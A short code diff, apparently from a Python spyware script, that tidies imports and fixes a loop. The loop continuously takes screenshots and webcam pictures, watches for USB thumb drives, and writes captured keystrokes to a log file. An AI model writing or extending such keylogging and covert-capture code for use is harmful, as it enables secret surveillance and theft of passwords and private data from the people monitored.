@@ -1,15 +1,17 @@
+import glob
 import io
 import os
-import cv2
-import glob
 import socket
+import threading
 import zipfile
+from datetime import datetime
+
+import cv2
 import pyautogui
-import win32file
 import pywinusb.hid as hid
+import win32file
 # import requests
 from pynput import keyboard
-from datetime import datetime, time
 
 keys = ""
 
@@ -120,11 +122,10 @@ if __name__ == "__main__":
 
         watch_thread = threading.Thread(target=watch_for_thumb_drive)
         watch_thread.start()
-        while true:
+        while True:
             take_screenshot()
             take_picture()
             if len(keys) > 50:
                 with open("log.log", "a") as log_file:
                     log_file.write(keys)
                     keys = ""
-
